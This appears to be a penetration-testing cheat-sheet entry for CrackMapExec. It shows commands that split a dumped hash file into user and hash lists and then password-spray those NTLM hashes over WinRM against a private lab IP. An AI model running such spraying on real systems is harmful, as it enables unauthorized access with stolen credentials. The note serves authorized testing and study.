# Crackmapexec

---

## PoC

Assuming we have dumped sensitive files and gained an list of usernames & hashes, we can utilize the following in order to create wordlists & also perform password spraying.

1) Created userlist.

```
cat hashes | cut -d ":" -f1 | tee users.txt
```

2) Created hash list.

```
cat hashes | cut -d ":" -f4 | tee hashes.txt
```

3) Performed password spraying.

```
crackmapexec winrm 192.168.248.175 -u users.txt -H hashes.txt
```
